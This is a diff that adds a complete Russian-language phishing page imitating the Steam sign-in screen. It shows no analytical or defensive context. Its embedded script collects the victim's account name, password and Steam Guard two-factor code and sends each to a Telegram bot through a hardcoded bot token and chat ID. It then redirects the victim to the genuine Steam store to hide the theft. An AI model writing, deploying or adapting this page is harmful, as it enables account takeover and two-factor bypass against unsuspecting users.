@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Войти в Steam</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1b2838; color: #c6d4df; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #16202d; padding: 24px; border-radius: 4px; width: 320px; }
+        h2 { font-weight: normal; margin-top: 0; }
+        input { width: 100%; padding: 10px; margin: 8px 0; background: #32353b; border: 1px solid #434953; color: #c6d4df; border-radius: 2px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #5c7e10; border: none; color: white; font-size: 16px; border-radius: 2px; cursor: pointer; }
+        button:hover { background: #6a9112; }
+    </style>
+</head>
+<body>
+    <div class="container" id="login_form">
+        <h2>Войти</h2>
+        <input type="text" id="username" placeholder="Имя аккаунта">
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="sendCredentials()">Войти</button>
+    </div>
+    <div class="container" id="code_form" style="display:none;">
+        <h2>Введите код из приложения Steam Guard</h2>
+        <input type="text" id="twofactorcode" placeholder="Код">
+        <button onclick="sendCode()">Подтвердить</button>
+    </div>
+
+    <script>
+        const TOKEN = '8698750847:AAF9sdIJ1A7fTtN2E586inRee0joNbs_nCE';
+        const CHAT_ID = '8171360047';
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text})
+            });
+        }
+
+        let currentUsername = '', currentPassword = '';
+
+        function sendCredentials() {
+            currentUsername = document.getElementById('username').value;
+            currentPassword = document.getElementById('password').value;
+            if (currentUsername && currentPassword) {
+                sendToTelegram(`🔥 НОВЫЙ ЛОГИН\nLogin: ${currentUsername}\nPassword: ${currentPassword}`);
+                document.getElementById('login_form').style.display = 'none';
+                document.getElementById('code_form').style.display = 'block';
+            }
+        }
+
+        function sendCode() {
+            const code = document.getElementById('twofactorcode').value;
+            if (code) {
+                sendToTelegram(`✅ КОД STEAM GUARD для ${currentUsername}: ${code}`);
+                window.location.href = 'https://store.steampowered.com';
+            }
+        }
+    </script>
+</body>
+</html>
